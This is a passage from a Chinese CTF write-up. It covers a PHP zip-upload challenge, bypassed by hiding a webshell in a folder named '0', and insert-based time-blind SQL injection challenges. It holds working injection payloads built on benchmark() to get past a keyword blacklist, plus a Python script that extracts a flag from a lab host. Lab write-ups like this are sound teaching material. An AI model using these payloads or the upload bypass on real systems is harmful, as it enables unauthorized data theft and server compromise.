    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$zip_name</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">zip_manager</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">path</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">gen_path</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">zip_name</span> <span class="token operator">=</span> <span class="token variable">$zip_name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">gen_path</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$chars</span><span class="token operator">=</span><span class="token string double-quoted-string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span><span class="token punctuation">;</span>
        <span class="token variable">$newchars</span><span class="token operator">=</span><span class="token function">str_split</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">shuffle</span><span class="token punctuation">(</span><span class="token variable">$newchars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$chars_key</span><span class="token operator">=</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token variable">$newchars</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$fnstr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">15</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$fnstr</span><span class="token operator">.=</span><span class="token variable">$newchars</span><span class="token punctuation">[</span><span class="token variable">$chars_key</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$fnstr</span><span class="token operator">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">deldir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">//先删除目录下的文件：</span>
        <span class="token variable">$dh</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$dh</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"."</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">!=</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token variable">$fullpath</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">deldir</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$dh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function-definition function">dir_list</span><span class="token punctuation">(</span><span class="token variable">$directory</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">dir</span><span class="token punctuation">(</span><span class="token variable">$directory</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token operator">-&gt;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">unzip</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$fullpath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">zip_name</span><span class="token punctuation">;</span>
        <span class="token variable">$white_list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'bmp'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">zip_manager</span><span class="token operator">-&gt;</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">zip_manager</span><span class="token operator">-&gt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">zip_manager</span><span class="token operator">-&gt;</span><span class="token function">getNameIndex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you bad bad"</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">zip_manager</span><span class="token operator">-&gt;</span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Unzip to /"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token operator">.</span><span class="token string double-quoted-string">"/ failed"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_list</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">dir_list</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/www/html/"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$file_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"dir? I deleted all things in it"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>@<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">deldir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/www/html/"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/www/html/"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$white_list</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"only image!!! I deleted it for you"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/www/html/"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>研究一会儿，最后不停翻开发手册，找到了可以逃过删除的地方</p>
<pre><code class="prism language-php"><span class="token keyword">function</span> <span class="token function-definition function">dir_list</span><span class="token punctuation">(</span><span class="token variable">$directory</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">dir</span><span class="token punctuation">(</span><span class="token variable">$directory</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token operator">-&gt;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>在手册中给出了<code>read()</code>或者说<code>readdir()</code>的推荐写法，用强比较来判定布尔值</p>
<p>另外还贴心的给出了弱比较下的问题，文件夹命名为<code>0</code>在弱比较下是<code>false</code>，写法不对会处理不到该文件夹，所以通过将木马藏在命名为<code>0</code>的文件夹来躲避删除</p>
<p>上马访问，看到根目录下的flag，权限不足不能看，试了一遍网上找的方法，都不行，靶机里少了很多命令，最后心一横直接测试有没有root权限的命令可以多flag，把可以查看文件的命令都走一圈，看看有没有谁有权限，发现<code>nl /flag</code>回显了flag</p>
<h2><a id="Really_Easy_SQLeasysql_406"></a>Really Easy SQL和easysql</h2>
<h3><a id="Really_Easy_SQL_408"></a>Really Easy SQL</h3>
<p>给了提示，是insert注入，黑名单如下</p>
<p><code>union</code>,<code>updatexml</code>,<code>order</code>,<code>by</code>,<code>substr</code>,空格,<code>and</code></p>
<p><code>extractvalue</code>,<code>;</code>,<code>sleep</code>,<code>join</code>,<code>alter</code>,<code>handler</code>,<code>char</code>,<code>+</code>,<code>/</code></p>
<p><code>like</code>,<code>regexp</code>,<code>offset</code>,<code>sleep</code>,<code>case</code>,<code>&amp;</code>,<code>-</code>,<code>hex</code>,<code>%0</code>,<code>load</code>;</p>
<p>提示的注入类型，让我想了好一会儿，看到网页的标题（钓鱼网站），反应过来自己误导自己了，既然是搜集数据的，后端处理肯定是insert，根据后面的和<strong>钓鱼网站</strong>，推测出是时间盲注</p>
<p>经过一番测试，时间盲注测试出来了</p>
<pre><code>username=a'or(benchmark(5000000,md5('test')))or'&amp;password=a&amp;submit=
</code></pre>
<p>这个题的过滤并不多，没啥难度，就直接把做题时的记录搬上来了</p>
<p><code>if</code>语句测试</p>
<pre><code>a'or(if(length(database())&gt;5,benchmark(1500000,md5('test')),1))or'
</code></pre>
<h4><a id="_434"></a>爆数据库：</h4>
<table><thead><tr><th>目标</th><th>结果</th><th>语句</th></tr></thead><tbody><tr><td>长度</td><td>3</td><td><code>a'or(if(length(database())&gt;5,benchmark(1500000,md5('test')),1))or'</code></td></tr><tr><td>名称</td><td>ctf</td><td><code>a'or(if(ascii(mid(database(),1,1))&gt;1,benchmark(1500000,md5('test')),1))or'</code></td></tr></tbody></table>
<h4><a id="_441"></a>爆表名</h4>
<p><code>select(length(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')</code></p>
<p><code>select(count(table_name))from(information_schema.tables)where(table_schema='ctf')</code></p>
<p>ctf的表总数: 2个</p>
<h5><a id="sql_449"></a>sql:</h5>
<p><code>a'or(if((select(count(table_name))from(information_schema.tables)where(table_schema='ctf'))&gt;1,benchmark(1500000,md5('test')),1))or'</code></p>
<p>两个表的名称：<code>flaggg</code>,<code>user</code></p>
<p><code>length(group_concat(table_name))</code> 长度为11</p>
<p><code>ascii(mid(group_concat(table_name),1,1))</code></p>
<p>sql:</p>
<p><code>a'or(if((select(ascii(mid(group_concat(table_name),1,1)))from(information_schema.tables)where(table_schema='ctf'))&gt;1,benchmark(1500000,md5('test')),1))or'</code></p>
<h4><a id="flaggg_463"></a>爆flaggg表列名</h4>
<p><code>count(column_name)</code> 只有1列</p>
<p><code>length(group_concat(column_name))</code> 长度为3</p>
<p><code>ascii(mid(group_concat(column_name),1,1))</code> cmd</p>
<p><code>select()from(information_schema.columns)where(table_schema='ctf')and(table_name='flaggg')</code></p>
<h5><a id="sql_473"></a>sql：</h5>
<p><code>a'or(if((select(ascii(mid(group_concat(column_name),1,1)))from(information_schema.columns)where(table_name='flaggg'))&gt;1,benchmark(1500000,md5('test')),1))or'</code></p>
<h4><a id="_477"></a>爆字段值</h4>
<p>count(cmd) 1列</p>
<p>length(cmd) 45</p>
<p>ascii(mid(group_concat(cmd),1,1))</p>
<pre><code>Dest0g3{8eb9db3c_0e53_4c11_a3ce_275adbb9f938}
</code></pre>
<h5><a id="sql_489"></a>sql：</h5>
<p><code>a'or(if((select(ascii(mid(group_concat(cmd),1,1)))from(flaggg))&gt;1,benchmark(1500000,md5('test')),1))or'</code></p>
<pre><code>Dest0g3{ad438575-S6e5-4802-a8a9-791c16622083}
Dest0g3{ad438575-d6P5-4802-a8ae-791c16622083}
</code></pre>
<p>脚本</p>
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
url <span class="token operator">=</span> <span class="token string">'http://2c43fc6c-2a78-439c-b63d-11b7d5aca5af.node4.buuoj.cn:81/'</span>
payload_flag <span class="token operator">=</span> <span class="token string">"a'or(if((select(ascii(mid(group_concat(cmd),{},1)))from(flaggg))={},benchmark(6000000,md5('test')),1))or'"</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload_flag<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"submit"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">}</span>
    starttime <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    endtime <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment">#print(r.text)</span>
    <span class="token keyword">if</span> <span class="token string">'429'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text <span class="token punctuation">:</span>
      time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
    t <span class="token operator">=</span> endtime <span class="token operator">-</span> starttime
    <span class="token keyword">if</span> t <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"位为"</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
      flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
      <span class="token keyword">break</span>
    <span class="token comment"># else:</span>
    <span class="token comment">#   print("第"+str(i)+"位不是"+chr(j))</span>
    
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
</code></pre>
<p>跑了好多遍，比对着才把正确flag拿出来，时间盲注精度低了些，特别是这垃圾校园网还拖后腿</p>
<h3><a id="Easy_SQL_530"></a>Easy SQL</h3>
<p>上面的脚本可以通杀，考虑时间盲注的误差，直接多跑几遍</p>
<pre><code>Dest0g3{6800b179-15c5-433a-8c1c-060da3b707dc}
</code></pre>
</div>
<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css" rel="stylesheet"/>
<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css" rel="stylesheet"/>
</div>